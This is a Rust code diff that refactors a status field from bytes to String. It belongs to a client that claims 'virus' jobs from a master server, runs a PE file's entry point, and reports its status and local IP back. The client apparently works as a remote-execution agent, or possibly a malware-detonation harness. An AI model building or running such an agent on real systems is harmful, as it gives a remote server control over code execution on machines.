@@ -30,7 +30,7 @@ struct Snapshot {
 struct VirusResult {
     id: u64,
     status: String,
-    out: Vec<u8>,
+    out: String,
 }
 
 #[tokio::main]
@@ -125,12 +125,12 @@ async fn run_virus_inner(client: reqwest::Client, virus: &Virus) -> Result<()> {
             .context("Не удалось выполнить точку входа PE-файл")?;
     }
 
-    send_status(&client, virus.id, "cooked", VICTORY.as_bytes().to_vec()).await?;
+    send_status(&client, virus.id, "cooked", VICTORY.to_owned()).await?;
 
     Ok(())
 }
 
-async fn send_status(client: &reqwest::Client, id: u64, status: &str, out: Vec<u8>) -> Result<()> {
+async fn send_status(client: &reqwest::Client, id: u64, status: &str, out: String) -> Result<()> {
     client
         .post(format!("{MASTER}/virus_status"))
         .json(&VirusResult {
@@ -150,7 +150,7 @@ async fn claim(client: &reqwest::Client, id: u64) -> Result<String> {
         .json(&VirusResult {
             id,
             status: "accepted".to_owned(),
-            out: local_ip().into_bytes(),
+            out: local_ip(),
         })
         .send()
         .await?
